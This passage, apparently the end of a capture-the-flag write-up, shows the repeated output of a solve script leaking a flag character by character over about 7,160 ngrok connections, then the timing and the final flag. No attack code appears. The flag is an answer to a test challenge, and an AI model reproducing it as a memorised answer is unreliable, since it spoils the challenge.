Your flag has character 'e' at index 32
#lag{5###a82e#ba044c0d##613ca##8e##8c}##
Your flag has character 'c' at index 36
#lag{5###a82e#ba044c0d##613ca##8e##8c}##
Your flag has character 'd' at index 21
#lag{5###a82e#ba044c0d##613ca##8e##8c}##
Your flag has character '6' at index 8
#lag{5##6a82e#ba044c0d##613ca##8e##8c}##
Your flag has character 'e' at index 32
#lag{5##6a82e#ba044c0d##613ca##8e##8c}##
Your flag has character 'f' at index 22
#lag{5##6a82e#ba044c0df#613ca##8e##8c}##
Your flag has character 'd' at index 6
#lag{5d#6a82e#ba044c0df#613ca##8e##8c}##
Your flag has character '8' at index 10
#lag{5d#6a82e#ba044c0df#613ca##8e##8c}##
Your flag has character '6' at index 24
#lag{5d#6a82e#ba044c0df#613ca##8e##8c}##
Your flag has character '4' at index 17
#lag{5d#6a82e#ba044c0df#613ca##8e##8c}##
Your flag has character 'b' at index 14
#lag{5d#6a82e#ba044c0df#613ca##8e##8c}##
Your flag has character 'd' at index 21
#lag{5d#6a82e#ba044c0df#613ca##8e##8c}##
Your flag has character '2' at index 23
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character '0' at index 16
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character 'a' at index 9
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character '}' at index 37
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character '5' at index 5
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character 'a' at index 28
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character 'e' at index 12
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character 'l' at index 1
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character 'b' at index 14
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character 'a' at index 28
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character '0' at index 20
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character 'f' at index 22
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character 'e' at index 32
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character '1' at index 25
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character 'a' at index 2
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character '4' at index 18
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character '8' at index 10
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character 'b' at index 14
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character '8' at index 10
#lag{5d#6a82e#ba044c0df2613ca##8e##8c}##
Your flag has character '8' at index 7
#lag{5d86a82e#ba044c0df2613ca##8e##8c}##
Your flag has character 'd' at index 21
#lag{5d86a82e#ba044c0df2613ca##8e##8c}##
Your flag has character '3' at index 26
#lag{5d86a82e#ba044c0df2613ca##8e##8c}##
Your flag has character 'a' at index 28
#lag{5d86a82e#ba044c0df2613ca##8e##8c}##
Your flag has character '0' at index 16
#lag{5d86a82e#ba044c0df2613ca##8e##8c}##
Your flag has character '5' at index 13
#lag{5d86a82e5ba044c0df2613ca##8e##8c}##
Your flag has character 'f' at index 22
#lag{5d86a82e5ba044c0df2613ca##8e##8c}##
Your flag has character 'a' at index 9
#lag{5d86a82e5ba044c0df2613ca##8e##8c}##
Your flag has character 'd' at index 6
#lag{5d86a82e5ba044c0df2613ca##8e##8c}##
Your flag has character '7' at index 29
#lag{5d86a82e5ba044c0df2613ca7#8e##8c}##
Your flag has character '2' at index 11
#lag{5d86a82e5ba044c0df2613ca7#8e##8c}##
Your flag has character '8' at index 10
#lag{5d86a82e5ba044c0df2613ca7#8e##8c}##
Your flag has character 'b' at index 34
#lag{5d86a82e5ba044c0df2613ca7#8e#b8c}##
Your flag has character '7' at index 29
#lag{5d86a82e5ba044c0df2613ca7#8e#b8c}##
Your flag has character '2' at index 23
#lag{5d86a82e5ba044c0df2613ca7#8e#b8c}##
Your flag has character 'c' at index 36
#lag{5d86a82e5ba044c0df2613ca7#8e#b8c}##
Your flag has character '{' at index 4
#lag{5d86a82e5ba044c0df2613ca7#8e#b8c}##
Your flag has character '4' at index 18
#lag{5d86a82e5ba044c0df2613ca7#8e#b8c}##
Your flag has character '8' at index 35
#lag{5d86a82e5ba044c0df2613ca7#8e#b8c}##
Your flag has character '}' at index 37
#lag{5d86a82e5ba044c0df2613ca7#8e#b8c}##
Your flag has character '1' at index 33
#lag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character '0' at index 20
#lag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'l' at index 1
#lag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character '6' at index 8
#lag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'f' at index 0
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'a' at index 2
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'l' at index 1
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character '5' at index 5
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character '6' at index 8
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'a' at index 9
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character '6' at index 24
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'd' at index 6
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'd' at index 6
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'd' at index 6
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character '0' at index 20
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'a' at index 28
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'b' at index 34
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'a' at index 9
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character '1' at index 25
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'a' at index 2
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character '6' at index 8
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character '8' at index 10
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'd' at index 21
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'a' at index 28
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'a' at index 15
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character 'e' at index 12
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character '8' at index 35
flag{5d86a82e5ba044c0df2613ca7#8e1b8c}##
Your flag has character '0' at index 30
flag{5d86a82e5ba044c0df2613ca708e1b8c}##
<KeyboardInterrupt>
python ngrocket_solve.py  65.51s user 90.91s system 10% cpu 25:32.35 total
{{< /code >}}

So in total, according to ngrok, we went through 7,160 connections,

```
Connections                   ttl     opn     rt1     rt5     p50     p90
                              7160    0       1.76    3.80    0.00    0.00
```

... and it took a total of

```
python ngrocket_solve.py  65.51s user 90.91s system 10% cpu 25:32.35 total
```

time!

Flag is `flag{5d86a82e5ba044c0df2613ca708e1b8c}`

